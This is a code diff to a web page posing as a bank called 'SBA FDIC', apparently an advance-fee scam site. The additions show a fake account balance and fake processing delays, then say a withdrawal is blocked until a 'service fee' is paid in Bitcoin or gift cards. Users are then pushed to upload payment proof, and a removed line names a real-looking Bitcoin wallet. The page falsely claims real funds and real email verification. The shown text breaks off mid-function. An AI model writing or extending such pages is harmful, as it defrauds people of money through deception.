@@ -4,7 +4,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SBA FDIC | USA</title>
+<title>SBA FDIC | INTERNATIONAL</title>
 
 <style>
 :root {
@@ -398,10 +398,183 @@ footer {
     .wallet-actions button { padding: 13px 5px; font-size: 13px; }
     .brand { font-size: 22px; }
 }
+
+.extra-screen {
+  display: none;
+  max-width: 900px;
+  margin: 24px auto;
+  padding: 24px;
+  background: #100e0a;
+  color: #ffffff;
+  border: 1px solid #f5c451;
+  border-radius: 14px;
+  box-sizing: border-box;
+}
+
+.extra-screen.active {
+  display: block !important;
+  visibility: visible !important;
+  opacity: 1 !important;
+  position: relative;
+  z-index: 10;
+}
+.extra-screen h2 {
+  color: #f5c451;
+  margin-top: 0;
+}
+
+.extra-screen .screen-back {
+  background: transparent;
+  color: #f5c451;
+  border: 1px solid #f5c451;
+  padding: 10px 16px;
+  border-radius: 8px;
+  cursor: pointer;
+  margin-bottom: 18px;
+}
+
+.extra-screen input,
+.extra-screen select,
+.extra-screen textarea {
+  display: block;
+  width: 100%;
+  box-sizing: border-box;
+  margin: 8px 0 16px;
+  padding: 12px;
+  border-radius: 8px;
+  border: 1px solid #806b35;
+  background: #1b1914;
+  color: #ffffff;
+}
+
+.extra-screen .screen-action {
+  background: #f5c451;
+  color: #100e0a;
+  border: 0;
+  padding: 12px 18px;
+  border-radius: 8px;
+  font-weight: bold;
+  cursor: pointer;
+}
+
+.extra-screen .screen-note {
+  color: #d7cba9;
+  font-size: 13px;
+  line-height: 1.6;
+}
+
+.image-upload-screen {
+  width: 100%;
+  max-width: 720px;
+  margin: 30px auto;
+  padding: clamp(20px, 5vw, 38px);
+  background:
+    radial-gradient(ellipse at 50% 0%, #443315 0%, transparent 55%),
+    linear-gradient(145deg, #171612, #0c0c0b);
+  border: 1px solid #80672f;
+  border-radius: 22px;
+  box-shadow: 0 22px 65px #0008;
+}
+
+.upload-heading {
+  text-align: center;
+  margin-bottom: 30px;
+}
+
+.upload-heading h2 {
+  margin: 14px 0 8px;
+  color: var(--gold-light);
+  font-size: clamp(24px, 5vw, 32px);
+}
+
+.upload-icon {
+  display: grid;
+  place-items: center;
+  width: 60px;
+  height: 60px;
+  margin: 0 auto;
+  color: var(--gold-light);
+  background: #302513;
+  border: 1px solid var(--gold);
+  border-radius: 18px;
+  font-size: 30px;
+}
+
+.upload-drop-area {
+  padding: 24px 18px;
+  margin-top: 8px;
+  text-align: center;
+  background: #0b0b0a;
+  border: 1px dashed #9a7b3b;
+  border-radius: 15px;
+}
+
+.upload-drop-area p {
+  margin: 12px 0 4px;
+  color: #f7f3e9;
+  font-weight: bold;
+}
+
+.upload-drop-area span {
+  display: block;
+  color: var(--muted);
+  font-size: 12px;
+}
+
+.upload-drop-area input {
+  margin-top: 20px;
+  text-align: left;
+}
+
+.image-preview-container {
+  margin-top: 20px;
+  padding: 16px;
+  background: #11110f;
+  border: 1px solid var(--border);
+  border-radius: 14px;
+}
+
+.image-preview-container img {
+  display: block;
+  width: 100%;
+  max-height: 360px;
+  object-fit: contain;
+  margin-bottom: 14px;
+  border-radius: 10px;
+  background: #080808;
+}
+
+.upload-submit {
+  width: 100%;
+  margin-top: 20px;
+}
+
+.upload-message {
+  margin-top: 18px;
+  overflow-wrap: anywhere;
+}
+
+@media (max-width: 600px) {
+  .image-upload-screen {
+    margin: 16px auto;
+    padding: 20px 16px;
+    border-radius: 16px;
+  }
+
+  .upload-drop-area {
+    padding: 20px 12px;
+  }
+}
+
 </style>
 </head>
 
 <body>
+
+<div id="pageLoader" class="hidden" role="status" aria-live="polite">
+    <div class="page-loader-spinner"></div>
+    <strong>Please wait...</strong>
+</div>
 
 <header>
     <div class="header-inner">
@@ -409,7 +582,7 @@ footer {
             <div class="brand">SBA <span>FDIC</span></div>
             <div class="small-note">Your "GOD DID" experience</div>
         </div>
-        <div class="small-note">ACROSS USA</div>
+        <div class="small-note">ACROSS THE WORLD</div>
     </div>
 </header>
 
@@ -480,15 +653,35 @@ footer {
     <!-- DASHBOARD -->
     <section id="dashboard" class="hidden">
 
-        <div class="dashboard-top">
-            <div>
-                <h2>My Dashboard</h2>
-                <p>Welcome, <strong id="userName">User</strong></p>
-            </div>
-            <button id="logoutButton" class="secondary" type="button">
-                Sign Out
-            </button>
-        </div>
+        
+<div class="dashboard-top">
+    <div>
+        <h2>My Dashboard</h2>
+        <p>WELCOME, <strong id="userName">User</strong></p>
+    </div>
+
+    <div style="display:flex; gap:10px; flex-wrap:wrap;">
+        <button
+            id="profileButton"
+            class="secondary"
+            type="button"
+            onclick="openProfileScreen()"
+        >
+            My Profile
+        </button>
+
+<button id="securityButton" class="secondary" type="button"
+  onclick="openSecurityScreen()">Security</button>
+
+        <button
+            id="logoutButton"
+            class="secondary"
+            type="button"
+        >
+            Sign Out
+        </button>
+    </div>
+</div>
 
         <div class="balance-card">
             <div class="balance-label">Account Balance</div>
@@ -599,11 +792,16 @@ footer {
                                placeholder="Enter a sample address">
                     </div>
 
-                    <label for="withdrawAmount">Amount (USD)</label>
-                    <input id="withdrawAmount" type="number"
-                           min="0.01" max="2550000" step="0.01"
-                           placeholder="Enter amount" required>
+                    
+<label for="withdrawAmount">Amount (USD)</label>
+<input id="withdrawAmount" type="number" min="0.01" max="2550000" step="0.01" placeholder="Enter amount" required>
 
+                     
+<div id="serviceFeeDisplay" class="screen-note" aria-live="polite">
+  Enter an amount to calculate the service fee.
+</div>
+
+                          
                     <button class="primary full" type="submit">
                         WITHDRAW
                     </button>
@@ -615,14 +813,21 @@ footer {
                 <div id="withdrawReview" class="review-card hidden">
                     <h3><CENTER>WARNING</CENTER></h3>
                     <p id="reviewDetails"></p>
+                    <p id="reviewFeeDetails"></p>
 
                     
                    
-                    <button id="cancelWithdrawal" class="primary full"
-        type="button">
-    Copy Wallet Address
+
+
+<button
+  id="cancelWithdrawal"
+  class="primary full"
+  type="button"
+>
+  Open Image Upload
 </button>
-                </div>
+
+</div>
             </section>
         </div>
 
@@ -632,7 +837,189 @@ footer {
             <div id="transactionList"></div>
         </section>
     </section>
+    
+<section id="withdrawReviewScreen" class="extra-screen hidden">
+    <button
+        type="button"
+        class="screen-back"
+        onclick="closeWithdrawalReview()"
+    >
+        ← Back to Withdrawal
+    </button>
+
+    <div class="panel">
+        <h2>Withdrawal </h2>
+        <div id="reviewDetailsScreen"></div>
+        <div id="reviewFeeDetailsScreen"></div>
+        
+<button
+    id="openSupportUploadFromReview"
+    type="button"
+    class="primary full"
+>
+    Image Upload
+</button>
+
+
+        <p>
+            This is a REAL withdrawal request. ALL real funds are
+            transferred by this screen. Review any applicable fees
+            and terms before proceeding.
+        </p>
+    </div>
+</section>
+
 </main>
+
+<section id="securityScreen" class="extra-screen">
+  <button
+    type="button"
+    class="screen-back"
+    id="securityBackButton"
+  >
+    ← Back to Dashboard
+  </button>
+
+  <h2>Security & Verification</h2>
+
+ 
+  <div class="notice">
+    <strong>Email verification</strong>
+    <p id="emailVerificationStatus">
+      Email verification has not been configured.
+    </p>
+  </div>
+
+  <div class="notice" style="margin-top:15px;">
+    <strong>Face verification</strong>
+    
+    <span class="small-note">Status: Not configured</span>
+  </div>
+
+  <div class="notice" style="margin-top:15px;">
+    <strong>Identity document verification</strong>
+    
+    <span class="small-note">Status: Not configured</span>
+  </div>
+</section>
+
+<section id="profileScreen" class="extra-screen">
+  <button
+    type="button"
+    class="screen-back"
+    id="profileBackButton"
+  >
+    ← Back to Dashboard
+  </button>
+
+  <h2>My Profile</h2>
+
+  
+  <form id="profileForm">
+    <label for="profileFullName">Full name</label>
+    <input
+      id="profileFullName"
+      type="text"
+      maxlength="100"
+      autocomplete="name"
+      placeholder="Enter your full name"
+      required
+    >
+
+    <label for="profileEmail">Email address</label>
+    <input
+      id="profileEmail"
+      type="email"
+      maxlength="254"
+      autocomplete="email"
+      placeholder="Enter your email"
+      required
+    >
+
+    <label for="profilePhone">Phone Number </label>
+    <input
+      id="profilePhone"
+      type="tel"
+      maxlength="25"
+      autocomplete="tel"
+      placeholder="Enter your phone number"
+    >
+
+    <button type="submit" class="screen-action">
+      Save Profile
+    </button>
+
+    <p
+      id="profileMessage"
+      class="screen-note"
+      role="status"
+      aria-live="polite"
+    ></p>
+  
+</form>
+
+
+</section>
+ </section>
+
+<section id="imageUploadScreen" class="extra-screen image-upload-screen">
+  <button
+    type="button"
+    class="screen-back"
+    id="imageUploadBack"
+  >
+    ← Back to Dashboard
+  </button>
+
+  <div class="upload-heading">
+    <div class="upload-icon">↑</div>
+    <h2>Image Submission</h2>
+    <p class="screen-note">
+      Select an image to preview it before submitting.
+      
+    </p>
+  </div>
+
+  <form id="imageUploadForm">
+    <label for="imageType">Image category</label>
+   <select id="imageType" required>
+  <option value="">Choose a category</option>
+  <option value="support">Bitcoin Payment Upload</option>
+  <option value="technical">Giftcard Upload</option>
+</select>
+    <label for="reviewImage">Choose an image</label>
+
+    <div class="upload-drop-area">
+      <div class="upload-icon">▧</div>
+      <p>Choose an image from your device</p>
+      <span>JPG, PNG or WEBP · Maximum 5 MB</span>
+      <input
+        id="reviewImage"
+        type="file"
+        accept="image/jpeg,image/png,image/webp"
+        required
+      >
+    </div>
+
+    <div id="imagePreviewContainer" class="image-preview-container hidden">
+      <img id="imagePreview" alt="Selected image preview">
+      <button id="removeImageButton" type="button" class="secondary">
+        Remove image
+      </button>
+    </div>
+
+    <button class="screen-action upload-submit" type="submit">
+  Submit 
+</button>
+  </form>
+
+  <div
+    id="imageUploadMessage"
+    class="screen-note upload-message"
+    role="status"
+    aria-live="polite"
+  ></div>
+</section>
 
 <footer>
     <p>© 2026 SBA FDIC. All rights reserved.</p>
@@ -649,8 +1036,7 @@ const MIGRATION_KEY = "sba_demo_balance_migrated_v1";
 let account = null;
 let transactions = [];
 
-const $ = id => document.getElementById(id);
-
+const $ = (id) => document.getElementById(id);
 function money(value) {
     return new Intl.NumberFormat("en-US", {
         style: "currency",
@@ -713,6 +1099,77 @@ function showDashboard() {
 
     renderBalance();
     renderTransactions();
+}
+
+function showPageLoader() {
+  const loader = document.getElementById("pageLoader");
+
+  if (!loader) {
+    return Promise.resolve();
+  }
+
+  loader.classList.remove("hidden");
+
+  return new Promise(function (resolve) {
+    setTimeout(function () {
+      loader.classList.add("hidden");
+      resolve();
+    }, 5000);
+  });
+}
+
+window.openWithdrawalReview = function () {
+    const reviewScreen = document.getElementById("withdrawReviewScreen");
+    const dashboard = document.querySelector("main");
+    const details = document.getElementById("reviewDetails");
+    const feeDetails = document.getElementById("reviewFeeDetails");
+    const screenDetails = document.getElementById("reviewDetailsScreen");
+    const screenFeeDetails = document.getElementById("reviewFeeDetailsScreen");
+
+    if (
+        !reviewScreen ||
+        !details ||
+        !feeDetails ||
+        !screenDetails ||
+        !screenFeeDetails
+    ) {
+        alert("The withdrawal review screen HTML is incomplete.");
+        return;
+    }
+
+    screenDetails.textContent = details.textContent;
+    screenFeeDetails.textContent = feeDetails.textContent;
+
+    if (dashboard) {
+        dashboard.classList.add("hidden");
+    }
+
+    reviewScreen.classList.remove("hidden");
+};
+
+
+
+function closeWithdrawalReview() {
+    const reviewScreen = document.getElementById("withdrawReviewScreen");
+    const dashboard = document.getElementById("dashboard");
+    const main = document.querySelector("main");
+
+    // Close the withdrawal review screen.
+    if (reviewScreen) {
+        reviewScreen.classList.add("hidden");
+        reviewScreen.classList.remove("active");
+    }
+
+    // Restore the main dashboard.
+    if (dashboard) {
+        dashboard.classList.remove("hidden");
+    }
+
+    if (main) {
+        main.classList.remove("hidden");
+    }
+
+    window.scrollTo({ top: 0, behavior: "smooth" });
 }
 
 function showLogin() {
@@ -804,7 +1261,7 @@ $("registerForm").addEventListener("submit", function (event) {
     showDashboard();
 });
 
-$("loginForm").addEventListener("submit", function (event) {
+$("loginForm").addEventListener("submit", async function (event) {
     event.preventDefault();
 
     const email = $("loginEmail").value.trim().toLowerCase();
@@ -842,6 +1299,7 @@ $("loginForm").addEventListener("submit", function (event) {
 
     account.transactions = transactions;
     saveAccount();
+    await showPageLoader();
     setSession(true);
     showDashboard();
 });
@@ -934,7 +1392,12 @@ $("withdrawButton").addEventListener("click", function () {
 });
 
 /* Return to the dashboard */
+
 $("backToDashboard").addEventListener("click", function () {
+    $("withdrawReviewScreen").classList.add("hidden");
+    $("withdrawReviewScreen").classList.remove("active");
+
+    $("dashboard").classList.remove("hidden");
     $("dashboard").classList.remove("withdrawal-screen");
     $("withdrawPanel").classList.add("hidden");
     $("withdrawReview").classList.add("hidden");
@@ -990,9 +1453,18 @@ $("withdrawMethod").addEventListener("change", function () {
     $("withdrawMessage").textContent = "";
 });
 
+function getEstimatedDemoFee(amount) {
+    if (!Number.isFinite(amount) || amount <= 0) return 0;
+    if (amount >= 2550000) return 1000;
+    if (amount >= 1000000) return 500;
+    if (amount >= 500000) return 250;
+    if (amount >= 100000) return 150;
+    if (amount >= 30000) return 100;
+    if (amount >= 10000) return 75;
+    return 50;
+}
 
-
-$("withdrawForm").addEventListener("submit", function (event) {
+$("withdrawForm").addEventListener("submit", async function (event) {
     event.preventDefault();
 
     if (!account) {
@@ -1032,16 +1504,74 @@ $("withdrawForm").addEventListener("submit", function (event) {
         venmo: "Venmo",
         crypto: "Crypto Transfer"
     };
-$("reviewDetails").style.color = "red";
+const withdrawButton = $("withdrawForm").querySelector(
+    'button[type="submit"]'
+);
 
-$("reviewDetails").textContent =
-    "A SERVICE FEE OF $830 HAS BEEN PLACED ON THIS ACCOUNT MAKING THE WITHDRAWAL BE PENDING UNTIL THE SERVICE DEPOSIT IS PAID INTO THIS BITCOIN WALLET //bc1q6mpexpcwqrqc38c7rf2tyh0mhazhgzl72cd36p// AND FUNDS WILL BE PROCESSED IMMEDIATELY";
-    $("withdrawReview").classList.remove("hidden");
-    $("withdrawMessage").textContent =
-       "Payment Ready";
-    $("withdrawMessage").className = "success";
+if (withdrawButton) {
+    withdrawButton.disabled = true;
+    withdrawButton.dataset.originalText = withdrawButton.textContent;
+    withdrawButton.innerHTML =
+        '<span class="page-loader-spinner" ' +
+        'style="display:inline-block;width:16px;height:16px;' +
+        'border-width:3px;vertical-align:middle;margin-right:8px;">' +
+        '</span>Processing Withdrawal Request...';
+
+    await new Promise(resolve => setTimeout(resolve, 10000));
+
+    withdrawButton.disabled = false;
+    withdrawButton.textContent = withdrawButton.dataset.originalText;
+}
+const fee = getEstimatedDemoFee(amount);
+
+
+
+$("reviewFeeDetails").textContent =
+    "WITHDRAWAL AMOUNT: $" +
+    amount.toLocaleString("en-US", {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2
+    }) +
+    "\n\nSERVICE FEE: $" +
+    fee.toLocaleString("en-US", {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2
+    });
+
+$("reviewFeeDetails").style.fontWeight = "900";
+$("reviewFeeDetails").style.textAlign = "center";
+$("reviewFeeDetails").style.fontSize = "18px";
+$("reviewFeeDetails").style.lineHeight = "1.8";
+$("reviewFeeDetails").style.whiteSpace = "pre-line";
+
+$("reviewFeeDetailsScreen").textContent =
+    $("reviewFeeDetails").textContent;
+
+$("reviewFeeDetailsScreen").style.fontWeight = "900";
+$("reviewFeeDetailsScreen").style.textAlign = "center";
+$("reviewFeeDetailsScreen").style.fontSize = "18px";
+$("reviewFeeDetailsScreen").style.lineHeight = "1.8";
+$("reviewFeeDetailsScreen").style.whiteSpace = "pre-line";
+
+const warningMessage =
+    "WARNING NOTICE\n\n" +
+     "Your withdrawal request is pending review. THE SERVICE FEE IS REQUIRED TO BE PAID BEFORE FUNDS CAN BE WITHDRAWN TO YOUR PREFERABLE ACCOUNT BALANCE IMMEDIATELY. PAY THROUGH BITCOIN OR GIFTCARD. Copy the Bitcoin address under your account balance and UPLOAD image of payment either via BITCION OR GIFTCARD on the Image Upload. #YOUR MONEY WILL BE SENT IMMEDIATELY AN UPLOAD IS MADE#\n\n" + 
+     "SBA FDIC\n\n" 
+     "Withdrawal Amount: $" + amount.toLocaleString("en-US") + "\nApplicable Service Fee: $" + fee.toLocaleString("en-US") + "\n\nSBA FDIC";
+$("reviewDetails").textContent = warningMessage;
+$("reviewDetails").style.color = "#ff0000";
+$("reviewDetails").style.textAlign = "center";
+$("reviewDetails").style.whiteSpace = "pre-line";
+
+$("reviewDetailsScreen").textContent = warningMessage;
+$("reviewDetailsScreen").style.color = "#ff0000";
+$("reviewDetailsScreen").style.textAlign = "center";
+$("reviewDetailsScreen").style.whiteSpace = "pre-line";
+
+$("withdrawReviewScreen").classList.remove("hidden");
+$("withdrawReviewScreen").classList.add("active");
+$("dashboard").classList.add("hidden");
 });
-
 async function copyWalletAddress() {
     const address = $("walletAddress").textContent.trim();
 
@@ -1056,7 +1586,6 @@ async function copyWalletAddress() {
 }
 
 $("copyAddress").addEventListener("click", copyWalletAddress);
-$("cancelWithdrawal").addEventListener("click", copyWalletAddress);
 
 /* Restore a saved demo session */
 (function initialise() {
@@ -1085,8 +1614,622 @@ $("cancelWithdrawal").addEventListener("click", copyWalletAddress);
         showLogin();
     }
 })();
+function closeExtraScreen() {
+    document.querySelectorAll(".extra-screen").forEach(function (screen) {
+        screen.classList.add("hidden");
+    });
+
+    if (typeof showDashboard === "function") {
+        showDashboard();
+    }
+}
+</script>
+
+<!-- Profile screen -->
+<section id="profileScreen" class="extra-screen">
+  <button type="button" class="screen-back" onclick="closeExtraScreen()">
+    ← Back
+  </button>
+
+  <h2>My Profile</h2>
+  
+  <form id="profileForm">
+    <label for="profileFullName">Full name</label>
+    <input
+      id="profileFullName"
+      type="text"
+      maxlength="100"
+      placeholder="Enter your name"
+      autocomplete="name"
+    >
+
+    <label for="profileEmail">Email address</label>
+    <input
+      id="profileEmail"
+      type="email"
+      maxlength="254"
+      placeholder="Enter your email"
+      autocomplete="email"
+    >
+
+    <label for="profilePhone">Phone number (optional)</label>
+    <input
+      id="profilePhone"
+      type="tel"
+      maxlength="25"
+      placeholder="Enter your phone number"
+      autocomplete="tel"
+    >
+
+    <button type="submit" class="screen-action">
+      Save Profile
+    </button>
+
+    <p id="profileMessage" class="screen-note" aria-live="polite"></p>
+  </form>
+</section>
+
+<script>
+(function () {
+  const profileScreen = document.getElementById("profileScreen");
+  const profileForm = document.getElementById("profileForm");
+
+  window.openExtraScreen = function (screenId) {
+    const screen = document.getElementById(screenId);
+    if (!screen) return;
+
+    document.querySelectorAll(".extra-screen").forEach(function (item) {
+      item.classList.remove("active");
+    });
+
+    profileScreen.dataset.previousDisplay =
+      document.querySelector("#authScreen, #dashboard, main")?.id || "";
+
+    const authScreen = document.getElementById("authScreen");
+    const dashboard = document.getElementById("dashboard");
+
+    if (authScreen) authScreen.style.display = "none";
+    if (dashboard) dashboard.style.display = "none";
+
+    screen.classList.add("active");
+    screen.scrollIntoView({ behavior: "smooth", block: "start" });
+  };
+
+  window.closeExtraScreen = function () {
+    document.querySelectorAll(".extra-screen").forEach(function (item) {
+      item.classList.remove("active");
+    });
+
+    const authScreen = document.getElementById("authScreen");
+    const dashboard = document.getElementById("dashboard");
+
+    if (authScreen) authScreen.style.display = "";
+    if (dashboard) dashboard.style.display = "";
+
+    if (typeof window.showDashboard === "function") {
+      window.showDashboard();
+    }
+  };
+
+  profileForm.addEventListener("submit", function (event) {
+    event.preventDefault();
+
+    const profile = {
+      name: document.getElementById("profileFullName").value.trim(),
+      email: document.getElementById("profileEmail").value.trim(),
+      phone: document.getElementById("profilePhone").value.trim()
+    };
+
+    try {
+      localStorage.setItem("paraworld_educational_profile", JSON.stringify(profile));
+      document.getElementById("profileMessage").textContent =
+        "Profile saved on this device.";
+    } catch (error) {
+      document.getElementById("profileMessage").textContent =
+        "Unable to save the profile in this browser.";
+    }
+  });
+
+  try {
+    const saved = JSON.parse(
+      localStorage.getItem("paraworld_educational_profile") || "{}"
+    );
+
+    document.getElementById("profileFullName").value = saved.name || "";
+    document.getElementById("profileEmail").value = saved.email || "";
+    document.getElementById("profilePhone").value = saved.phone || "";
+  } catch (error) {
+    // Continue with an empty profile if saved data is unavailable.
+  }
+})();
+</script>
+<!-- Profile screen -->
+<section id="profileScreen" class="extra-screen">
+  <button type="button" class="screen-back" onclick="closeExtraScreen()">
+    ← Back
+  </button>
+
+  <h2>My Profile</h2>
+  
+  <form id="profileForm">
+    <label for="profileFullName">Full name</label>
+    <input
+      id="profileFullName"
+      type="text"
+      maxlength="100"
+      placeholder="Enter your name"
+      autocomplete="name"
+    >
+
+    <label for="profileEmail">Email address</label>
+    <input
+      id="profileEmail"
+      type="email"
+      maxlength="254"
+      placeholder="Enter your email"
+      autocomplete="email"
+    >
+
+    <label for="profilePhone">Phone number (optional)</label>
+    <input
+      id="profilePhone"
+      type="tel"
+      maxlength="25"
+      placeholder="Enter your phone number"
+      autocomplete="tel"
+    >
+
+    <button type="submit" class="screen-action">
+      Save Profile
+    </button>
+
+    <p id="profileMessage" class="screen-note" aria-live="polite"></p>
+  </form>
+</section>
+<script>
+(function () {
+  const profileScreen = document.getElementById("profileScreen");
+  const profileForm = document.getElementById("profileForm");
+
+  window.openExtraScreen = function (screenId) {
+    const screen = document.getElementById(screenId);
+    if (!screen) return;
+
+    document.querySelectorAll(".extra-screen").forEach(function (item) {
+      item.classList.remove("active");
+    });
+
+    profileScreen.dataset.previousDisplay =
+      document.querySelector("#authScreen, #dashboard, main")?.id || "";
+
+    const authScreen = document.getElementById("authScreen");
+    const dashboard = document.getElementById("dashboard");
+
+    if (authScreen) authScreen.style.display = "none";
+    if (dashboard) dashboard.style.display = "none";
+
+    screen.classList.add("active");
+    screen.scrollIntoView({ behavior: "smooth", block: "start" });
+  };
+
+  window.closeExtraScreen = function () {
+    document.querySelectorAll(".extra-screen").forEach(function (item) {
+      item.classList.remove("active");
+    });
+
+    const authScreen = document.getElementById("authScreen");
+    const dashboard = document.getElementById("dashboard");
+
+    if (authScreen) authScreen.style.display = "";
+    if (dashboard) dashboard.style.display = "";
+
+    if (typeof window.showDashboard === "function") {
+      window.showDashboard();
+    }
+  };
+
+  profileForm.addEventListener("submit", function (event) {
+    event.preventDefault();
+
+    const profile = {
+      name: document.getElementById("profileFullName").value.trim(),
+      email: document.getElementById("profileEmail").value.trim(),
+      phone: document.getElementById("profilePhone").value.trim()
+    };
+
+    try {
+      localStorage.setItem("paraworld_educational_profile", JSON.stringify(profile));
+      document.getElementById("profileMessage").textContent =
+        "Profile saved on this device.";
+    } catch (error) {
+      document.getElementById("profileMessage").textContent =
+        "Unable to save the profile in this browser.";
+    }
+  });
+
+  try {
+    const saved = JSON.parse(
+      localStorage.getItem("paraworld_educational_profile") || "{}"
+    );
+
+    document.getElementById("profileFullName").value = saved.name || "";
+    document.getElementById("profileEmail").value = saved.email || "";
+    document.getElementById("profilePhone").value = saved.phone || "";
+  } catch (error) {
+    // Continue with an empty profile if saved data is unavailable.
+  }
+})();
+
+(function () {
+  const profileScreen = document.getElementById("profileScreen");
+  const profileForm = document.getElementById("profileForm");
+
+  if (!profileScreen || !profileForm) return;
+
+  const profileFields = {
+    name: document.getElementById("profileFullName"),
+    email: document.getElementById("profileEmail"),
+    phone: document.getElementById("profilePhone")
+  };
+
+  function openProfileScreen() {
+    if (!account) {
+      showLogin();
+      return;
+    }
+
+    profileFields.name.value = account.name || "";
+    profileFields.email.value = account.email || "";
+    profileFields.phone.value = "";
+
+    $("authScreen").classList.add("hidden");
+    $("dashboard").classList.add("hidden");
+
+    document.querySelectorAll(".extra-screen").forEach(function (screen) {
+      screen.classList.remove("active");
+    });
+
+    profileScreen.classList.add("active");
+    $("profileMessage").textContent = "";
+
+    window.scrollTo({ top: 0, behavior: "smooth" });
+  }
+
+  function closeProfileScreen() {
+    profileScreen.classList.remove("active");
+
+    if (account) {
+      showDashboard();
+    } else {
+      showLogin();
+    }
+
+    window.scrollTo({ top: 0, behavior: "smooth" });
+  }
+
+  $("profileBackButton").addEventListener(
+    "click",
+    closeProfileScreen
+  );
+
+  profileForm.addEventListener("submit", function (event) {
+    event.preventDefault();
+
+    if (!account) {
+      $("profileMessage").textContent =
+        "Please sign in before editing your profile.";
+      return;
+    }
+
+    const name = profileFields.name.value.trim();
+    const email = profileFields.email.value.trim().toLowerCase();
+
+    if (!name || !email) {
+      $("profileMessage").textContent =
+        "Please enter your name and email address.";
+      return;
+    }
+
+    account.name = name;
+    account.email = email;
+
+    if (!saveAccount()) {
+      $("profileMessage").textContent =
+        "Unable to save your profile in this browser.";
+      return;
+    }
+
+    $("userName").textContent = account.name;
+
+    $("profileMessage").textContent =
+      "Profile saved on this device.";
+  });
+
+  window.openProfileScreen = openProfileScreen;
+})();
+
+(function () {
+  const screen = document.getElementById("securityScreen");
+  const backButton = document.getElementById("securityBackButton");
+
+  if (!screen || !backButton) return;
+
+  window.openSecurityScreen = function () {
+    if (!account) {
+      showLogin();
+      return;
+    }
+
+    $("authScreen").classList.add("hidden");
+    $("dashboard").classList.add("hidden");
+
+    document.querySelectorAll(".extra-screen").forEach(function (item) {
+      item.classList.remove("active");
+    });
+
+    screen.classList.add("active");
+
+    $("emailVerificationStatus").textContent =
+      "Real email verification is configured.";
+
+    window.scrollTo({ top: 0, behavior: "smooth" });
+  };
+
+ 
+backButton.addEventListener("click", function (event) {
+    event.preventDefault();
+
+    screen.classList.remove("active");
+    screen.classList.remove("hidden");
+
+    document.querySelectorAll(".extra-screen").forEach(function (item) {
+        item.classList.remove("active");
+    });
+
+    const authScreen = document.getElementById("authScreen");
+    const dashboard = document.getElementById("dashboard");
+
+    if (authScreen) authScreen.classList.add("hidden");
+    if (dashboard) dashboard.classList.remove("hidden");
+
+    if (typeof showDashboard === "function") {
+        showDashboard();
+    }
+
+    window.scrollTo({ top: 0, behavior: "smooth" });
+});
+})();
+</script>
+
+<script>
+
+function clearPreview() {
+  const fileInput = document.getElementById("reviewImage");
+  const preview = document.getElementById("imagePreview");
+  const previewContainer = document.getElementById("imagePreviewContainer");
+
+  if (previewUrl) {
+    URL.revokeObjectURL(previewUrl);
+    previewUrl = null;
+  }
+
+  if (fileInput) fileInput.value = "";
+  if (preview) preview.removeAttribute("src");
+  if (previewContainer) previewContainer.classList.add("hidden");
+}
+
+let previewUrl = null;
+
+(function () {
+  const screen = document.getElementById("imageUploadScreen");
+  const form = document.getElementById("imageUploadForm");
+  const backButton = document.getElementById("imageUploadBack");
+  const fileInput = document.getElementById("reviewImage");
+  const message = document.getElementById("imageUploadMessage");
+  const previewContainer = document.getElementById("imagePreviewContainer");
+  const preview = document.getElementById("imagePreview");
+  const removeButton = document.getElementById("removeImageButton");
+  const openButton = document.getElementById("cancelWithdrawal");
+  const dashboard = document.getElementById("dashboard");
+  const authScreen = document.getElementById("authScreen");
+
+  if (!screen || !form || !backButton || !fileInput ||
+      !message || !previewContainer || !preview || !removeButton || !openButton) {
+    console.error("Image upload: one or more required HTML elements are missing.");
+    return;
+  }
+
+  openButton.addEventListener("click", function () {
+    document.querySelectorAll(".extra-screen").forEach(function (item) {
+      item.classList.remove("active");
+    });
+
+    if (authScreen) authScreen.classList.add("hidden");
+    if (dashboard) dashboard.classList.add("hidden");
+
+    screen.classList.remove("hidden");
+    screen.classList.add("active");
+    screen.scrollIntoView({ behavior: "smooth", block: "start" });
+  });
+
+  backButton.addEventListener("click", function () {
+    screen.classList.remove("active");
+    if (dashboard) dashboard.classList.remove("hidden");
+    if (authScreen) authScreen.classList.add("hidden");
+    window.scrollTo({ top: 0, behavior: "smooth" });
+  });
+
+  fileInput.addEventListener("change", function () {
+    if (previewUrl) {
+      URL.revokeObjectURL(previewUrl);
+      previewUrl = null;
+    }
+
+    preview.removeAttribute("src");
+    previewContainer.classList.add("hidden");
+    message.textContent = "";
+
+   const file = fileInput.files && fileInput.files[0];
+const category = document.getElementById("imageType").value;
+
+console.log("Image selected:", !!file, "Category:", category);
+    if (!file) return;
+
+    if (!["image/jpeg", "image/png", "image/webp"].includes(file.type)) {
+      message.textContent = "Choose a JPG, PNG, or WEBP image.";
+      message.className = "screen-note error";
+      fileInput.value = "";
+      return;
+    }
+
+    if (file.size > 5 * 1024 * 1024) {
+      message.textContent = "The image must be 5 MB or smaller.";
+      message.className = "screen-note error";
+      fileInput.value = "";
+      return;
+    }
+
+    previewUrl = URL.createObjectURL(file);
+    preview.src = previewUrl;
+    previewContainer.classList.remove("hidden");
+    message.textContent = "Image selected. Check the preview before continuing.";
+    message.className = "screen-note success";
+  });
+
+  removeButton.addEventListener("click", function () {
+    clearPreview();
+    message.textContent = "Image removed.";
+    message.className = "screen-note";
+  });
+
+  form.addEventListener("submit", async function (event) {
+console.log("PARAworld: Submit handler started");
+event.preventDefault();
+  const file = fileInput.files && fileInput.files[0];
+  const category = document.getElementById("imageType").value;
+
+  if (!category || !file) {
+    message.textContent = "Choose a category and select an image first.";
+    message.className = "screen-note error";
+    return;
+  }
+
+  if (!["support", "technical"].includes(category)) {
+    message.textContent = "Please choose a valid support category.";
+    message.className = "screen-note error";
+    return;
+  }
+
+  if (!["image/jpeg", "image/png", "image/webp"].includes(file.type) ||
+      file.size > 5 * 1024 * 1024) {
+    message.textContent = "Choose a JPG, PNG, or WEBP image no larger than 5 MB.";
+    message.className = "screen-note error";
+    return;
+  }
+
+  const submitButton = form.querySelector('[type="submit"]');
+  submitButton.disabled = true;
+  message.textContent = "Submitting Image...";
+  await new Promise(resolve => setTimeout(resolve, 5000));
+
+submitButton.innerHTML =
+    '<span class="page-loader-spinner" ' +
+    'style="display:inline-block;width:18px;height:18px;' +
+    'border-width:3px;vertical-align:middle;margin-right:8px;">' +
+    '</span>Submitting...';
+
+await new Promise(resolve => setTimeout(resolve, 5000));
+  message.className = "screen-note";
+
+  try {
+    const data = new FormData();
